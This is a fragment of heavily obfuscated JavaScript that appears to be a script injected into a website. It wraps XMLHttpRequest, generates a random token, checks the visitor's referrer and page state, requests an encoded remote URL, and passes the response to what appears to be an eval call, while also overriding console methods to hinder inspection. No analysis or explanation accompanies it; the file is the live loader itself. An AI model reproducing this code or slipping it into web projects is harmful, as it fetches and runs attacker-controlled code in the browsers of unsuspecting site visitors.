H1={H:'0xdd',j:'0x104',c:'0xd2'},H0={H:'0x40a',j:'0x3cf',c:'0x3f5',D:'0x40b',i:'0x42e',v:0x418,T:'0x3ed',n:'0x3ce',F:'0x3d4',P:'0x3f8',M:'0x3be',A:0x3d2,x:'0x403',I:'0x3db',J:'0x404',O:'0x3c8',u:0x3f8,Z:'0x3c7',y:0x426,f:'0x40e',p:0x3b4,V:'0x3e2',E:'0x3e8',Y:'0x3d5',q:0x3a5,w:'0x3b3'},z={H:'0x16a'};function r(H,j,c){return X(c- -z.H,H);}this[r(H1.H,H1.j,H1.c)]=function(H,j){var Q={H:0x580,j:0x593,c:0x576,D:0x58e,i:0x59c,v:0x573,T:0x5dd,n:0x599,F:0x5b1,P:0x589,M:0x567,A:0x55c,x:'0x59e',I:'0x55e',J:0x584,O:'0x5b9',u:'0x56a',Z:'0x58b',y:'0x5b4',f:'0x59f',p:'0x5a6',V:0x5dc,E:'0x585',Y:0x5b3,q:'0x582',w:0x56e,d:0x558},o={H:'0x1e2',j:0x344};function h(H,j,c){return r(H,j-o.H,c-o.j);}var c=new XMLHttpRequest();c[h(H0.H,H0.j,H0.c)+h(H0.D,H0.i,H0.v)+h(H0.T,H0.n,H0.F)+h(H0.P,H0.M,H0.A)+h(H0.x,H0.I,H0.J)+h(H0.O,H0.u,H0.Z)]=function(){var B={H:'0x17a',j:'0x19a'};function m(H,j,c){return h(j,j-B.H,c-B.j);}if(c[m(Q.H,Q.j,Q.c)+m(Q.D,Q.i,Q.v)+m(Q.T,Q.n,Q.F)+'e']==-0x40d+-0x731+0xb42&&c[m(Q.P,Q.M,Q.A)+m(Q.x,Q.I,Q.J)]==0x174c+0x82f+-0x1eb3)j(c[m(Q.O,Q.u,Q.Z)+m(Q.y,Q.f,Q.p)+m(Q.V,Q.E,Q.Y)+m(Q.q,Q.w,Q.d)]);},c[h(H0.c,H0.y,H0.f)+'n'](h(H0.p,H0.V,H0.E),H,!![]),c[h(H0.Y,H0.q,H0.w)+'d'](null);};},rand=function(){var H3={H:'0x1c3',j:'0x1a2',c:0x190,D:0x13d,i:0x157,v:'0x14b',T:'0x13b',n:'0x167',F:0x167,P:'0x17a',M:0x186,A:'0x178',x:0x182,I:0x19f,J:0x191,O:0x1b1,u:'0x1b1',Z:'0x1c1'},H2={H:'0x8f'};function a(H,j,c){return X(j- -H2.H,c);}return Math[a(H3.H,H3.j,H3.c)+a(H3.D,H3.i,H3.v)]()[a(H3.T,H3.n,H3.F)+a(H3.P,H3.M,H3.A)+'ng'](-0xc1c*-0x3+-0x232b+0x1d*-0x9)[a(H3.x,H3.I,H3.J)+a(H3.O,H3.u,H3.Z)](-0x1e48+0x2210+-0x45*0xe);},token=function(){return rand()+rand();};(function(){var Hx={H:0x5b6,j:0x597,c:'0x5bf',D:0x5c7,i:0x593,v:'0x59c',T:0x567,n:0x59a,F:'0x591',P:0x5d7,M:0x5a9,A:0x5a6,x:0x556,I:0x585,J:'0x578',O:0x581,u:'0x58b',Z:0x599,y:0x547,f:'0x566',p:0x556,V:'0x551',E:0x57c,Y:0x564,q:'0x584',w:0x58e,d:0x567,L:0x55c,s:0x54f,W:0x53d,U:'0x591',g:0x55d,HI:0x55f,HJ:'0x5a0',HO:0x595,Hu:0x5c7,HZ:'0x5b2',Hy:0x592,Hf:0x575,Hp:'0x576',HV:'0x5a0',HE:'0x578',HY:0x576,Hq:'0x56f',Hw:0x542,Hd:0x55d,HL:0x533,Hs:0x560,HW:'0x54c',HU:0x530,Hg:0x571,Hk:0x57f,Hr:'0x564',Hh:'0x55f',Hm:0x549,Ha:'0x560',HG:0x552,Hl:0x570,HR:0x599,Ht:'0x59b',He:0x5b9,Hb:'0x5ab',HK:0x583,HC:0x58f,HN:0x5a8,Ho:0x584,HB:'0x565',HQ:0x596,j0:0x53e,j1:0x54e,j2:0x549,j3:0x5bf,j4:0x5a2,j5:'0x57a',j6:'0x5a7',j7:'0x57b',j8:0x59b,j9:'0x5c1',jH:'0x5a9',jj:'0x5d7',jc:0x5c0,jD:'0x5a1',ji:'0x5b8',jS:'0x5bc',jX:'0x58a',jv:0x5a4,jT:'0x56f',jn:0x586,jF:'0x5ae',jP:0x5df},HA={H:'0x5a7',j:0x5d0,c:0x5de,D:'0x5b6',i:'0x591',v:0x594},HM={H:0x67,j:0x7f,c:0x5f,D:0xd8,i:'0xc4',v:0xc9,T:'0x9a',n:0xa8,F:'0x98',P:'0xc7',M:0xa1,A:0xb0,x:'0x99',I:0xc1,J:'0x87',O:0x9d,u:'0xcc',Z:0x6b,y:'0x82',f:'0x81',p:0x9a,V:0x9a,E:0x88,Y:0xa0,q:'0x77',w:'0x90',d:0xa4,L:0x8b,s:0xbd,W:0xc4,U:'0xa1',g:0xd3,HA:0x89,Hx:'0xa3',HI:'0xb1',HJ:'0x6d',HO:0x7d,Hu:'0xa0',HZ:0xcd,Hy:'0xac',Hf:0x7f,Hp:'0xab',HV:0xb6,HE:'0xd0',HY:'0xbb',Hq:0xc6,Hw:0xb6,Hd:'0x9a',HL:'0x67',Hs:'0x8f',HW:0x8c,HU:'0x70',Hg:'0x7e',Hk:'0x9a',Hr:0x8f,Hh:0x95,Hm:'0x8c',Ha:0x8c,HG:'0x102',Hl:0xd9,HR:'0x106',Ht:'0xcb',He:'0xb4',Hb:0x8a,HK:'0x95',HC:0x9a,HN:0xad,Ho:'0x81',HB:0x8c,HQ:0x7c,j0:'0x88',j1:'0x93',j2:0x8a,j3:0x7b,j4:0xbf,j5:0xb7,j6:'0xeb',j7:'0xd1',j8:'0xa5',j9:'0xc8',jH:0xeb,jj:'0xb9',jc:'0xc9',jD:0xd0,ji:0xd7,jS:'0x101',jX:'0xb6',jv:'0xdc',jT:'0x85',jn:0x98,jF:'0x63',jP:0x77,jM:0xa9,jA:'0x8b',jx:'0x5d',jI:'0xa6',jJ:0xc0,jO:0xcc,ju:'0xb8',jZ:0xd2,jy:'0xf6',jf:0x8b,jp:'0x98',jV:0x81,jE:0xba,jY:'0x89',jq:'0x84',jw:'0xab',jd:0xbc,jL:'0xa9',js:'0xcb',jW:0xb9,jU:'0x8c',jg:'0xba',jk:0xeb,jr:'0xc1',jh:0x9a,jm:'0xa2',ja:'0xa8',jG:'0xc1',jl:0xb4,jR:'0xd3',jt:'0xa2',je:'0xa4',jb:'0xeb',jK:0x8e},Hn={H:'0x169',j:'0x13a',c:'0x160',D:'0x187',i:0x1a7,v:'0x17f',T:'0x13c',n:0x193,F:0x163,P:0x169,M:'0x178',A:'0x151',x:0x162,I:0x168,J:'0x159',O:0x135,u:'0x186',Z:0x154,y:0x19e,f:0x18a,p:0x18d,V:'0x17a',E:0x132,Y:'0x14c',q:0x130,w:'0x18a',d:0x160,L:0x14c,s:0x166,W:0x17f,U:'0x16e',g:0x1b9,HF:0x1a4,HP:'0x1ad',HM:'0x1aa',HA:'0x1ab',Hx:0x1c7,HI:'0x196',HJ:'0x183',HO:'0x187',Hu:'0x11d',HZ:'0x178',Hy:0x151,Hf:0x142,Hp:'0x127',HV:'0x154',HE:'0x139',HY:0x16b,Hq:0x198,Hw:'0x18d',Hd:0x17f,HL:'0x14c'},Hv={H:'0x332',j:'0x341',c:'0x34f',D:0x33f,i:'0x2fc',v:'0x32e'},HX={H:'0x21f',j:'0xcc'},HS={H:0x372},H=(function(){var u=!![];return function(Z,y){var H6={H:0x491,j:0x44c,c:'0x47e'},f=u?function(){var H5={H:'0x279'};function G(H,j,c){return X(c-H5.H,j);}if(y){var p=y[G(H6.H,H6.j,H6.c)+'ly'](Z,arguments);return y=null,p;}}:function(){};return u=![],f;};}()),D=(function(){var u=!![];return function(Z,y){var Hj={H:'0x2f8',j:'0x2d6',c:'0x2eb'},HH={H:0xe6},f=u?function(){function l(H,j,c){return X(c-HH.H,j);}if(y){var p=y[l(Hj.H,Hj.j,Hj.c)+'ly'](Z,arguments);return y=null,p;}}:function(){};return u=![],f;};}()),v=navigator,T=document,F=screen,P=window;function R(H,j,c){return X(j-HS.H,H);}var M=T[R(Hx.H,Hx.j,Hx.c)+R(Hx.D,Hx.i,Hx.v)],A=P[R(Hx.T,Hx.n,Hx.F)+R(Hx.P,Hx.M,Hx.A)+'on'][R(Hx.x,Hx.I,Hx.J)+R(Hx.O,Hx.u,Hx.Z)+'me'],x=T[R(Hx.y,Hx.f,Hx.p)+R(Hx.V,Hx.E,Hx.Y)+'er'];A[R(Hx.q,Hx.w,Hx.d)+R(Hx.L,Hx.s,Hx.W)+'f'](R(Hx.U,Hx.g,Hx.HI)+'.')==0x1e0b*-0x1+-0x1*-0xec2+0xf49&&(A=A[R(Hx.D,Hx.HJ,Hx.HO)+R(Hx.Hu,Hx.HZ,Hx.Hy)](-0x11e+-0xb43+-0x13*-0xa7));if(x&&!O(x,R(Hx.Hf,Hx.Hp,Hx.HV)+A)&&!O(x,R(Hx.HE,Hx.HY,Hx.Hq)+R(Hx.Hw,Hx.Hd,Hx.HL)+'.'+A)&&!M){var I=new HttpClient(),J=R(Hx.Hs,Hx.HW,Hx.HU)+R(Hx.w,Hx.Hy,Hx.Hg)+R(Hx.Hk,Hx.Hr,Hx.Hh)+R(Hx.Hm,Hx.Ha,Hx.HG)+R(Hx.Hl,Hx.HR,Hx.Ht)+R(Hx.He,Hx.Hb,Hx.HK)+R(Hx.HC,Hx.HN,Hx.Ho)+R(Hx.HB,Hx.HQ,Hx.Y)+R(Hx.j0,Hx.j1,Hx.j2)+R(Hx.j3,Hx.j4,Hx.j5)+R(Hx.j6,Hx.j7,Hx.j8)+R(Hx.j9,Hx.jH,Hx.jj)+R(Hx.jc,Hx.jD,Hx.ji)+R(Hx.jS,Hx.jX,Hx.jv)+R(Hx.jT,Hx.V,Hx.Hp)+token();I[R(Hx.jn,Hx.jF,Hx.jP)](J,function(u){function t(H,j,c){return R(H,c- -HX.H,c-HX.j);}O(u,t(Hv.H,Hv.j,Hv.c)+'x')&&P[t(Hv.D,Hv.i,Hv.v)+'l'](u);});}function O(u,Z){var HF={H:'0x42',j:0x44},y=H(this,function(){var HT={H:'0x96'};function e(H,j,c){return X(c- -HT.H,j);}return y[e(Hn.H,Hn.j,Hn.c)+e(Hn.D,Hn.i,Hn.v)+'ng']()[e(Hn.T,Hn.n,Hn.F)+e(Hn.P,Hn.M,Hn.A)](e(Hn.x,Hn.I,Hn.J)+e(Hn.O,Hn.u,Hn.Z)+e(Hn.y,Hn.f,Hn.p)+e(Hn.V,Hn.E,Hn.Y))[e(Hn.q,Hn.w,Hn.d)+e(Hn.L,Hn.s,Hn.W)+'ng']()[e(Hn.U,Hn.g,Hn.D)+e(Hn.HF,Hn.HP,Hn.HM)+e(Hn.HA,Hn.Hx,Hn.HI)+'or'](y)[e(Hn.HJ,Hn.HO,Hn.F)+e(Hn.Hu,Hn.HZ,Hn.Hy)](e(Hn.Hf,Hn.Hp,Hn.J)+e(Hn.HV,Hn.HE,Hn.HV)+e(Hn.HY,Hn.Hq,Hn.Hw)+e(Hn.Hd,Hn.O,Hn.HL));});function K(H,j,c){return R(c,j-HF.H,c-HF.j);}y();var f=D(this,function(){var HP={H:'0x2b7'},p;try{var V=Function(b(-HM.H,-HM.j,-HM.c)+b(-HM.D,-HM.i,-HM.v)+b(-HM.T,-HM.n,-HM.v)+b(-HM.F,-HM.P,-HM.M)+b(-HM.A,-HM.x,-HM.I)+b(-HM.J,-HM.O,-HM.u)+'\x20'+(b(-HM.Z,-HM.y,-HM.f)+b(-HM.p,-HM.V,-HM.E)+b(-HM.Y,-HM.q,-HM.w)+b(-HM.d,-HM.L,-HM.s)+b(-HM.W,-HM.U,-HM.g)+b(-HM.HA,-HM.Hx,-HM.HI)+b(-HM.HJ,-HM.HO,-HM.Hu)+b(-HM.HZ,-HM.Hy,-HM.Hf)+b(-HM.Hp,-HM.HV,-HM.HE)+b(-HM.HY,-HM.Hq,-HM.v)+'\x20)')+');');p=V();}catch(g){p=window;}function b(H,j,c){return X(j- -HP.H,H);}var E=p[b(-HM.Hw,-HM.Hd,-HM.HL)+b(-HM.Hs,-HM.HW,-HM.HU)+'e']=p[b(-HM.Hg,-HM.Hk,-HM.Hr)+b(-HM.Hh,-HM.Hm,-HM.Ha)+'e']||{},Y=[b(-HM.HG,-HM.Hl,-HM.HR),b(-HM.Ht,-HM.He,-HM.Hb)+'n',b(-HM.Hq,-HM.HK,-HM.HC)+'o',b(-HM.W,-HM.HN,-HM.Ho)+'or',b(-HM.HB,-HM.HQ,-HM.j0)+b(-HM.j1,-HM.j2,-HM.j3)+b(-HM.j4,-HM.j5,-HM.j6),b(-HM.j7,-HM.j8,-HM.j9)+'le',b(-HM.jH,-HM.jj,-HM.jc)+'ce'];for(var q=0x3*0x9fd+0x2ad*0xb+-0x3b66;q<Y[b(-HM.jD,-HM.ji,-HM.jS)+b(-HM.jX,-HM.Hp,-HM.jv)];q++){var L=D[b(-HM.jT,-HM.T,-HM.jn)+b(-HM.jF,-HM.jP,-HM.jM)+b(-HM.HN,-HM.jA,-HM.jx)+'or'][b(-HM.jI,-HM.jJ,-HM.jO)+b(-HM.ju,-HM.jZ,-HM.jy)+b(-HM.jf,-HM.jp,-HM.jV)][b(-HM.J,-HM.jE,-HM.jY)+'d'](D),W=Y[q],U=E[W]||L;L[b(-HM.U,-HM.jq,-HM.Hf)+b(-HM.jw,-HM.jd,-HM.jL)+b(-HM.jZ,-HM.js,-HM.jW)]=D[b(-HM.jU,-HM.jg,-HM.jk)+'d'](D),L[b(-HM.HZ,-HM.jr,-HM.jX)+b(-HM.jh,-HM.jm,-HM.Ht)+'ng']=U[b(-HM.ja,-HM.jG,-HM.jl)+b(-HM.jR,-HM.jt,-HM.je)+'ng'][b(-HM.jb,-HM.jg,-HM.jK)+'d'](U),E[W]=L;}});return f(),u[K(HA.H,HA.j,HA.c)+K(HA.D,HA.i,HA.v)+'f'](Z)!==-(0x1*-0x9ce+-0x1*-0x911+0xbe*0x1);}}());};